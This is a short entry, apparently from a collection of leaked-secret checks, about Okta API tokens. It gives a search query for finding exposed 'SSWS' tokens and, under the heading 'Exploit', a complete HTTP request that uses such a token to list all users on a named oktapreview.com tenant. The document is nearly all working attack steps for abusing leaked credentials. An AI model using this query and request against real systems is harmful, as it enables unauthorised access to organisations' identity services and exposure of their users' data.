# Oktapreview api

### Search

```
oktapreview.com AND Authorization AND SSWS 
```

### Exploit

```
GET /api/v1/users HTTP/2
Host: mw-classic.oktapreview.com
Authorization: SSWS {token}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Cache-Control: max-age=0


```
